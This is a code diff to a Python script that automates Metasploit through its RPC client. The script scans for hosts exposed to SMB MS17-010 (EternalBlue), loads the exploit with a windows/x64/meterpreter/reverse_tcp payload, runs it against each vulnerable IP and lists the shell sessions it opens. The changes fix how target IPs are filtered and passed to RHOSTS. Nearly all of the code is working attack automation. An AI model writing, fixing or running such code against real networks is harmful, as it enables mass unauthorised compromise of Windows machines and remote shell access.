@@ -48,6 +48,7 @@ def script_automate_scan():
 def script_automate_exploit(data_read_out, client, console):
     # check opened port
     opened_vuln_port, ip_vuln = look_for_port()
+    ip_vuln_reconf=[]
     # print(opened_vuln_port)
 
     # test with putting an unexploitable
@@ -64,8 +65,8 @@ def script_automate_exploit(data_read_out, client, console):
 
     for data in data_read_out:
      for ip in ip_vuln:
-         if ip[0] not in data:
-            ip_vuln.remove(ip)
+         if ip[0] in data and ip[0] not in ip_vuln_reconf:
+             ip_vuln_reconf.append(ip[0])
 
     #######################################CONFIG EXPLOIT####################################
     auxiliary_scan = 'auxiliary/scanner/smb/smb_ms17_010'
@@ -77,7 +78,7 @@ def script_automate_exploit(data_read_out, client, console):
 
     #######################################CONFIG OPTIONS AND PAYLOAD#######################
 
-    # pdb.set_trace()
+    #pdb.set_trace()
     running_config_exploit = main_change_option_exploit('CheckModule', auxiliary_scan, 'STR', exploit)
 
     payload = main_choose_payload('windows/x64/meterpreter/reverse_tcp', client)
@@ -85,7 +86,7 @@ def script_automate_exploit(data_read_out, client, console):
 
     for ip in ip_vuln:
         # print(ip)
-        main_change_option_exploit('RHOSTS', ip, 'STR', exploit)
+        main_change_option_exploit('RHOSTS', ip[0], 'STR', exploit)
         json, session_create = main_exe_exploit(payload, exploit, client)
 
     print(client.sessions.list)
